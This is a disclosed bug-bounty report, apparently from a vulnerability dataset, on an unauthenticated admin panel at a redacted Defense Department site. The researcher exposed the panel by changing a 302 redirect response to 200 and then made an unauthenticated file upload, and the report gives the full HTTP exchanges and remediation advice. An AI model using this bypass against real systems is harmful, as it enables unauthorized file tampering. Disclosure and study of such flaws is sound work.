{
  "reported_to": "U.S. Dept Of Defense",
  "reported_by": "palaziv ",
  "title": "Unauthenticated Access to Admin Panel Functions at https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588",
  "content": "\nDescription:\nI discovered that the admin panel at https://\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588 and all its functions can be accessed without authentication.\nImpact\nAn attacker is able to use the administrative functions in order to upload, delete or modify files.\nSystem Host(s)\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nAffected Product(s) and Version(s)\n\u2588\u2588\u2588\u2588\u2588\u2588's \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (\u2588\u2588\u2588) Management\nCVE Numbers\nSteps to Reproduce\nNavigate to https://\u2588\u2588\u2588\u2588\u2588/ and click on the \"\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\" button\nNotice how the application first sends an HTTP POST request to https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588 which gets answered with a redirect to https://\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588 which again redirects to https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nLooking at the response to https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588 I noticed that even though the server sent back a 302 status code with a header Location: /\u2588\u2588\u2588\u2588\u2588 the response was quite long\nI browsed to https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588, intercepted the response in Burp, changed the status code from 302 Found to 200 OK and was presented with the admin panel (this kind of attack is called Execution after Redirect). Below you can see the unmodified response containing links to the \u2588\u2588\u2588 Admin Functions:\nCode 4.64 KiB\n1HTTP/1.1 302 Found\n2Date: Mon, 08 Nov 2021 20:28:44 GMT\n3Content-Type: text/html; charset=UTF-8\n4Connection: close\n5Cache-Control: no-store, no-cache, must-revalidate\n6Expires: Thu, 19 Nov 1981 08:52:00 GMT\n7Location: /\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n8Pragma: no-cache\n9X-Vcap-Request-Id: f4014a06-51c2-44c3-4e4f-6db613c30484\n10Strict-Transport-Security: max-age=31536000; includeSubDomains\n11Content-Length: 4260\n12\n13\n14<table align=\"center\" width=\"800\" border=\"1\" cellspacing=\"1\"\n15\tcellpadding=\"1\" bgcolor=\"#008000\">\n16\t<tr>\n17\t\t<td style=\"color: #FFF\" ;=\"\" align=\"center\">LIMITED DISTRIBUTION<br> <font\n18\t\t\tsize=\"2px\">Distribution authorized to DoD, IAW 10 U.S.C. &#167&#167\n19\t\t\t\t130 &amp; 455. Release authorized to U.S. DoD contractors, IAW 48\n20\t\t\t\tC.F.R. &#167 252.245-7000. <br>Refer other requests to:\n21\t\t\t\tHeadquarters, \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588, ATTN: Release Officer, \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n22\t\t\t\t\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588. <br>Destroy IAW DoDD 5030.59.\n23\t\t\t\tRemoval of this caveat is prohibited.\n24\t\t</font></td>\n25\t</tr>\n26</table>\n27<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\n28<html lang='en' xmlns=\"http://www.w3.org/1999/xhtml\">\n29<head>\n30<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\n31<title>Admin</title>\n32<script src=\"../\u2588\u2588\u2588\u2588\u2588\u2588\u2588p/SpryAssets/SpryMenuBar.js\" type=\"text/javascript\"></script>\n33<link href=\"../\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588p/SpryAssets/SpryMenuBarHorizontal.css\"\n34\trel=\"stylesheet\" type=\"text/css\" />\n35</head>\n36\n37<body>\n38\t<table align=\"center\" bgcolor=\"#82F379\" border=\"3\">\n39\t\t<tr>\n40\t\t\t<td colspan=\"2\" align=\"center\"><img\n41\t\t\t\tsrc=\"../\u2588\u2588\u2588\u2588\u2588\u2588p/images/\u2588\u2588\u2588_banner_top.jpg\" /></td>\n42\t\t</tr>\n43\t\t<tr>\n44\t\t\t<td align=\"center\"><br />\n45            \u2588\u2588\u2588\u2588 You are on NIPR NET RESTRICTIVE<br /></td>\n46\t\t</tr>\n47\t\t<tr>\n48\t\t\t<td>\n49\t\t\t\t<div align=\"center\">\n50\t\t\t\t\t<ul id=\"MenuBar1\" class=\"MenuBarHorizontal\">\n51\t\t\t\t\t\t<li><a class=\"MenuBarItemSubmenu\" href=\"#\">Home</a></li>\n52\t\t\t\t\t\t<li><a class=\"MenuBarItemSubmenu\" href=\"#\">\u2588\u2588\u2588\u2588\u2588\u2588\u2588 Admin Functions</a>\n53\t\t\t\t\t\t\t<ul>\n54\t\t\t\t\t\t\t\t<li><a href=\"s3html.php\">UpLoad Weekly</a></li>\n55\t\t\t\t\t\t\t\t<li><a href=\"../\u2588\u2588\u2588\u2588p/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/verifyfile.php\">Verify File Dates</a></li>\n56\t\t\t\t\t\t\t\t<li><a href=\"#\">Add Single File</a>\n57\t\t\t\t\t\t\t\t\t<ul>\n58\t\t\t\t\t\t\t\t\t\t<li><a href=\"../\u2588\u2588\u2588\u2588p/\u2588\u2588\u2588/addnewfile.php\" target=\"new\">VDU ADD\n59\t\t\t\t\t\t\t\t\t\t</a></li>\n60\t\t\t\t\t\t\t\t\t\t<li><a href=\"../\u2588\u2588\u2588\u2588p/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/addvpf.php\" target=\"new\">VPF ADD</a></li>\n61\t\t\t\t\t\t\t\t\t\t<li><a href=\"../\u2588\u2588\u2588\u2588\u2588\u2588\u2588p/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588class.php\" target=\"new\">Change\n62\t\t\t\t\t\t\t\t\t\t\t\tClassification</a></li>\n63\t\t\t\t\t\t\t\t\t\t<li><a href=\"../\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588p/\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\">New \u2588\u2588\u2588\u2588\u2588</a></li>\n64\t\t\t\t\t\t\t\t\t\t<li><a href=\"../\u2588\u2588\u2588\u2588p/\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588loadgraph.php\" target=\"new\">Graphic\n65\t\t\t\t\t\t\t\t\t\t\t\tADD</a></li>\n66\t\t\t\t\t\t\t\t\t\t<li><a href=\"../\u2588\u2588\u2588p/\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588delgrp.php\">Delete 'ALL' Graphic\n67\t\t\t\t\t\t\t\t\t\t\t\tFiles</a></li>\n68\t\t\t\t\t\t\t\t\t</ul></li>\n69\t\t\t\t\t\t\t\t<li><a href=\"#\">Upload New Editions</a>\n70\t\t\t\t\t\t\t\t\t<ul>\n71\t\t\t\t\t\t\t\t\t\t<li><a href=\"../\u2588\u2588\u2588p/\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588loadvdu.php\" target=\"new\">Install\n72\t\t\t\t\t\t\t\t\t\t\t\tNew Base VDU </a></li>\n73\t\t\t\t\t\t\t\t\t\t<li><a href=\"../\u2588\u2588\u2588\u2588\u2588p/\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588loadvpf.php\" target=\"new\">Install\n74\t\t\t\t\t\t\t\t\t\t\t\tNew base VPF </a></li>\n75\t\t\t\t\t\t\t\t\t\t<li><a href=\"../\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588p/\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588loadtxt.php\" target=\"new\">Install/Update\n76\t\t\t\t\t\t\t\t\t\t\t\t\u2588\u2588\u2588\u2588\u2588\u2588##.txt</a></li>\n77\t\t\t\t\t\t\t\t\t\t<li><a href=\"../\u2588\u2588\u2588\u2588\u2588p/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588newgraph.php\" target=\"new\">Replace\n78\t\t\t\t\t\t\t\t\t\t\t\tall Graphic Files</a></li>\n79\t\t\t\t\t\t\t\t\t</ul></li>\n80\t\t\t\t\t\t\t\t<li><a href=\"#\">Modify Single File**</a>\n81\t\t\t\t\t\t\t\t\t<ul>\n82\t\t\t\t\t\t\t\t\t\t<li><a href=\"../\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588p/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588mod.php\">Modify \u2588\u2588\u2588\u2588\u2588\u2588 Chart</a></li>\n83\t\t\t\t\t\t\t\t\t\t<li><a href=\"../\u2588\u2588\u2588\u2588p/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588vitem.php\">Modify Library Specific\n84\t\t\t\t\t\t\t\t\t\t\t\tFile</a></li>\n85\t\t\t\t\t\t\t\t\t\t<li><a href=\"../\u2588\u2588\u2588p/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588viteml.php\">Stop ALL VPFS from\n86\t\t\t\t\t\t\t\t\t\t\t\tbeing viewed from specific Region</a></li>\n87\t\t\t\t\t\t\t\t\t\t<li><a href=\"../\u2588\u2588\u2588p/\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588graphic.php\">Modify Graphic\n88\t\t\t\t\t\t\t\t\t\t\t\tSpecific File</a></li>\n89\t\t\t\t\t\t\t\t\t</ul></li>\n90\t\t\t\t\t\t\t\t<li><a href=\"../\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588p/\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588vpfdel.php\">DELETE VPF, VDU,\n91\t\t\t\t\t\t\t\t\t\tGraphics</a></li>\n92\t\t\t\t\t\t\t\t<li><a href=\"#\">Change Status of Deleted and New Records</a>\n93\t\t\t\t\t\t\t\t\t<ul>\n94\t\t\t\t\t\t\t\t\t\t<li><a href=\"../\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588p/\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588deldel.php\">Change Record Status\n95\t\t\t\t\t\t\t\t\t\t\t\tTo an ADDed or DELeted VDU Record</a></li>\n96\t\t\t\t\t\t\t\t\t</ul></li>\n97\t\t\t\t\t\t\t\t<li><a href=\"../\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588p/\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588_documentation.php\">\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n98\t\t\t\t\t\t\t\t\t\tDocumentation</a></li>\n99\t\t\t\t\t\t\t</ul></li>\n100\t\t\t\t\t\t<li><a href=\"dssLogout.php\">Logout</a></li>\n101\t\t\t\t\t</ul>\n102\t\t\t\t</div>\n103\t\t\t\t<p>&nbsp;</p>\n104\t\t\t\t<p>&nbsp;</p>\n105\t\t\t\t<p>\n106\t\t\t\t\t<br /> <br />\n107\t\t\t\t</p>\n108\t\t\t</td>\n109\t\t</tr>\n110\t\t<tr>\n111\t\t\t<td><br /> <br /></td>\n112\t\t</tr>\n113\t\t<tr align=\"center\">\n114\t\t</tr>\n115\t</table>\n116\t<script type=\"text/javascript\">\n117    var MenuBar1 = new Spry.Widget.MenuBar(\"MenuBar1\", {imgDown:\"../SpryAssets/SpryMenuBarDownHover.gif\", imgRight:\"../SpryAssets/SpryMenuBarRightHover.gif\"});\n118</script>\n119</body>\n120</html>\n121\nThe functions allow to upload, modify and to delete \u2588\u2588\u2588\u2588 files and can all be used completely unauthenticated. Following an example in which I upload a file; this upload function can be accessed from https://\u2588\u2588\u2588/elist/s3html.php. Note that the request has no session cookie:\nCode 1.44 KiB\n1POST /\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 HTTP/1.1\n2Host: \u2588\u2588\u2588\n3Content-Length: 899\n4Cache-Control: max-age=0\n5Upgrade-Insecure-Requests: 1\n6Origin: https://\u2588\u2588\u2588\u2588\u2588\n7Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryT4r0MDX8IcQqr8D9\n8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36\n9Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\n10Referer: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/elist/s3html.php\n11Accept-Encoding: gzip, deflate\n12Accept-Language: en-US,en;q=0.9\n13Connection: close\n14\n15------WebKitFormBoundaryT4r0MDX8IcQqr8D9\n16Content-Disposition: form-data; name=\"nNtM\"\n17\n1813/37\n19------WebKitFormBoundaryT4r0MDX8IcQqr8D9\n20Content-Disposition: form-data; name=\"oNtM\"\n21\n2213/37\n23------WebKitFormBoundaryT4r0MDX8IcQqr8D9\n24Content-Disposition: form-data; name=\"update\"\n25\n262021-11-08\n27------WebKitFormBoundaryT4r0MDX8IcQqr8D9\n28Content-Disposition: form-data; name=\"nxtdate\"\n29\n302021-12-06\n31------WebKitFormBoundaryT4r0MDX8IcQqr8D9\n32Content-Disposition: form-data; name=\"regionSelect\"\n33\n3401\n35------WebKitFormBoundaryT4r0MDX8IcQqr8D9\n36Content-Disposition: form-data; name=\"type\"\n37\n38windows\n39------WebKitFormBoundaryT4r0MDX8IcQqr8D9\n40Content-Disposition: form-data; name=\"userfile1[]\"; filename=\"test.txt\"\n41Content-Type: text/plain\n42\n43test\n44\n45------WebKitFormBoundaryT4r0MDX8IcQqr8D9\n46Content-Disposition: form-data; name=\"buttonm\"\n47\n48Begin Uploads\n49------WebKitFormBoundaryT4r0MDX8IcQqr8D9--\n50\nResponse:\nCode 870 Bytes\n1HTTP/1.1 302 Found\n2Date: Mon, 08 Nov 2021 21:03:35 GMT\n3Content-Type: text/html; charset=UTF-8\n4Connection: close\n5Cache-Control: no-store, no-cache, must-revalidate\n6Expires: Thu, 19 Nov 1981 08:52:00 GMT\n7Location: 404.html\n8Pragma: no-cache\n9Set-Cookie: JSESSIONID=0g33q2a5b6hkj02pv9hro94dqa; path=/; HttpOnly\n10Set-Cookie: __VCAP_ID__=7aa1d3ae-4d04-4a15-6476-fac8; Path=/; HttpOnly; Secure\n11X-Vcap-Request-Id: c7bd3c85-075f-43d3-4a45-7f494a6cc748\n12Strict-Transport-Security: max-age=31536000; includeSubDomains\n13Set-Cookie: TS01485890=01d8bb34a4a839126a96d80bd04820274929fd7bd07f6a640cdcbc306946f3965158fe2cdee1ce628fee6943b7320cf7b62b158749; Path=/\n14Content-Length: 337\n15\n16<br> path is /\u2588\u2588\u2588\u2588\u2588\u2588\u2588<br> get outtest.txt<br>S3 keyname: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588p/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588test.txt<br>i = 0, Upload SUCCESS!<br>S3 ObjectURL: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588p/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588test.txt<br>error in \u2588\u2588\u2588\u2588\u2588\u2588charts table \nSuggested Mitigation/Remediation Actions\nImplement proper access controls.\nMitigation for the Execution after Redirect vulnerability: Proper termination should be performed after redirects. In a function a return should be performed. In other instances functions such as die() should be performed. This will tell the application to terminate regardless of if the page is redirected or not.\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": null,
  "weaknesses": [
    "Improper Access Control - Generic"
  ],
  "screenshots": {},
  "disclosed_date": 1638241860,
  "report_url": "https://hackerone.com/reports/1394910",
  "is_multi_component": true,
  "complexity": "MEDIUM",
  "novelty": "LOW",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Navigate to https://\u2588\u2588\u2588\u2588\u2588/ and click on the \"\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\" button"
    ],
    [
      2,
      "Intercept the response in Burp, change the status code from 302 Found to 200 OK to access the admin panel"
    ]
  ],
  "vuln_description": "Unauthenticated access to admin panel functions due to an Execution after Redirect vulnerability, allowing attackers to upload, delete, or modify files without authentication.",
  "reason": "The vulnerability involves a straightforward manipulation of HTTP response codes to bypass authentication, without requiring complex interactions or understanding of multiple components.",
  "new_complexity": "LOW",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "idor_detectable": false,
  "authnz_byppass_detectable": true,
  "is_simple_payload": false,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reasoning": "The vulnerability involves accessing the admin panel without authentication by manipulating the HTTP response status code. The methodology includes testing actions with unauthenticated sessions (step d). Since the admin panel functions are accessible without any session, the automated system would detect this by attempting to access admin functions with no session, thereby identifying the authz bypass. The core issue is missing access controls on admin endpoints, which aligns with the AuthN/AuthZ Bypass detection method.",
    "is_simple_authnz": true
  }
}